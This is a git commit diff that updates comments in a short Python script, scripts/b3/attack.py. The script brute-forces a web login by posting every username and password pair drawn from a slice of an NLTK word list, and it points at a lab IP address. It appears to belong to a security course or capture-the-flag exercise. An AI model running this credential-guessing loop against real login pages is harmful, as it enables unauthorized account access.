0a3d719e46fe4be22a0afaf356a7dadc50da42b9
Wenjing Wu <wwu@pdx.edu>
2019-12-16 22:01:17 -0800

    update comment for attack scripts

--- scripts/b3/attack.py
+++ scripts/b3/attack.py
@@ -7,18 +7,22 @@ from nltk.corpus import words
 
 
 #word range printed in start message and start/b3dict.txt
+#replace with [YOUR_BEGIN_INDEX:YOUR_END_INDEX+1]
+#python list slice list[begin:end)
 creds = words.words()[81003:81024]
 
-#url='http://YOUR_INTERNAL_IP:PORT/login'
-#url='http://10.138.0.42/login'
-url='http://35.247.73.157/login'
+#url='http://YOUR_INTERNAL_IP/login'
+url='http://10.138.0.60/login'
 
-
+#iterate over dictionary list for user names
 for u in creds:
+        #iterate over dictionary list for passwords
 	for p in creds:
-		#two name attributes of input elements
+		#prepare data for post request
 		payload={'username':u,'password':p}
+                #send username and password through post method to web app url
 		post=requests.Session().post(url, data=payload)
+                #check if respond text contains invalid credentails
 		if 'Invalid credentials' not in  post.text:
 			#print valid username and password
 			print(u+' '+p )
